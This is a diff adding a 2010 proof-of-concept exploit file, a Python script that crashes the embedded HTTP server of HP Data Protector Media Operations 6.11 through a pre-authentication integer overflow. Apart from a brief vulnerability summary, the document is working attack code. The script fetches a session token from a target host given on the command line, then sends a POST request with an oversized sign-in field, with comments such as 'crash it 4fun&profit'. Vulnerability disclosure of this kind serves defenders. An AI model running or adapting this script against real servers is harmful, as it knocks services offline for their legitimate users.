@@ -1,0 +1,102 @@
+# Exploit Title: HP Data Protector Media Operations 6.11 HTTP Server Remote Integer Overflow DoS
+# Date: [date]:	17/09/10
+# Author: d0lc3 (@rmallof http://elotrolad0.blogspot.com/)
+# Software Link: http://www.hp.com
+# Version: 6.11
+# Tested on: Windows XP SP3 Spa
+#
+#Sumary:
+"""
+HP Data Protector Media Operations has embebed HTTP server, allowing access through
+this protocol for users.
+
+Flaw was detected on this implementation, causing remote and pre-authenticated DoS: Integer Overflow 
+handling string sended length through POST method.
+
+Integer Overflow causes unexpected variable initiation (reset to 0) followed by its dereferenciation
+(NUll Dereference), crashing server and thus deniying service to legitimate users.
+
+This is not explpoitable.
+"""
+#PoC:
+
+#!/usr/bin/python
+
+import socket,sys,time,os
+#global vars
+neg="GET / HTTP/1.1\r\n\r\n"
+lim0="Location:"						
+lim1="&"
+lim2="sess="
+buf="SignInName="+("A"*0x8000)+"&SignInPassword=FOO&Sign+In=Log+In" # >= 0x8000 to int overflow
+
+def CV():
+	os.system("clear")
+	print"\t-HP Data Protector Media Operations 6.11-"
+	print"\t    -HTTP Remote Denial of Service-"
+	print"\n[+] Researcher:\tRoi Mallo (@rmallof)"
+	print"[+] Blog:\thttp://elotrolad0.blogspot.com/"
+	print"[+] Twitter:\thttps://www.twitter.com/rmallof"
+	print"\n\n"
+
+def nego(h):									#starting connection and getting session
+	s=socket.socket()
+	try:
+		s.connect(h)
+	except:
+		print"[x] Error connecting to remote host!"
+		sys.exit(0)
+	s.send(neg)
+	time.sleep(1)
+	rec=s.recv(1024)
+	s.close()
+	return rec
+
+def buildPOST(s,h,p,b):								#building POST request for crashes server
+	P="POST /4daction/wHandleURLs/handleSignIn?sess="+s+"&siteCode=0&lang=en& HTTP/1.1\r\n"
+	P+="Host: "+h+"\r\n"
+	P+="User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10\r\n"
+	P+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	P+="Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\n"
+	P+="Accept-Encoding: gzip,deflate\r\n"
+	P+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
+	P+="Keep-Alive: 115\r\n"
+	P+="Connection: keep-alive\r\n"
+	P+="Referer: http://"+h+p+"\r\n"
+	P+="Content-Type: application/x-www-form-urlencoded\r\n"
+	P+="Content-Length: %s\r\n" % str(len(b))
+	P+="\r\n"
+	P+=b
+	time.sleep(1)
+	return P
+
+def main():
+	CV()		
+	if len(sys.argv)!=2:
+		print"\n[x] Usage: "+sys.argv[0]+" <host>\n\n"							
+		sys.exit(0)
+	else:
+		host=sys.argv[1]
+		hostd=host,80
+	#1
+	print"[-] Getting HTTP session..."
+	r=nego(hostd)								#getting new session...
+	path=r[r.index(lim0)+len(lim0)+1:r.rindex(lim1)+1]			#search for PATH
+	sess=path[path.index(lim2)+len(lim2):path.index(lim1)+len(lim1)-1]	#search for SESSION hash
+	time.sleep(1)
+	print"[+] 0k, session ="+sess
+	time.sleep(1)
+	#2
+	s=socket.socket()
+	s.connect(hostd)
+	print"[-] Bulding POST [Content-Length: %d bytes]..." % len(buf)
+	POST=buildPOST(sess,host,path,buf)					#build POST request with new session
+	print"[+] Done, Sayonara ;)"
+	s.send(POST)								#crash it 4fun&profit :)
+	time.sleep(1)							
+	s.close()
+if __name__=="__main__":
+	main()
+
+
+
